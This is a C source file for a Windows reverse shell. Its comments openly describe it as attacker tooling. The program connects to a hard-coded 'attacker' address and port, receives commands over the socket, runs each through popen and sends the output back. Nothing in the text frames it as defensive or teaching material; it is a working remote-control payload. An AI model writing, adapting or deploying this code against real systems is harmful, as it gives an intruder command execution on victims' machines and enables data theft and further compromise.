#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <unistd.h>

#define MAX_COMMAND_LENGTH 1024

// Server (attacker) information
#define LHOST "10.0.1.35"  // Attacker's IP address (change as necessary)
#define LPORT 4444             // Attacker's listening port (change as necessary)

// Initialize Winsock (on Windows systems)
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        exit(1);
    }
}

// Clean up Winsock (on Windows systems)
void cleanup_winsock() {
    WSACleanup();
}

// Function to execute system commands and send the output back
void execute_command(SOCKET sock) {
    char buffer[MAX_COMMAND_LENGTH];
    FILE *fp;
    while (1) {
        // Receive command from the attacker
        int recv_size = recv(sock, buffer, MAX_COMMAND_LENGTH, 0);
        if (recv_size == SOCKET_ERROR) {
            printf("Error in receiving data\n");
            break;
        }
        
        buffer[recv_size] = '\0';  // Null-terminate the received command
        
        // Exit condition
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        // Execute the received command and send the output back
        fp = popen(buffer, "r");
        if (fp == NULL) {
            snprintf(buffer, sizeof(buffer), "Failed to execute command\n");
            send(sock, buffer, strlen(buffer), 0);
            continue;
        }
        
        // Read the output of the command and send it back to the server
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }
        
        fclose(fp);
    }
}

int main() {
    SOCKET sock;
    struct sockaddr_in server_addr;

    // Initialize Winsock
    init_winsock();

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Set up the server address (attacker's IP and port)
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(LPORT);
    server_addr.sin_addr.s_addr = inet_addr(LHOST);

    // Connect to the attacker's server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection to server failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Once connected, start receiving and executing commands
    execute_command(sock);

    // Close the socket and clean up
    closesocket(sock);
    cleanup_winsock();

    return 0;
}
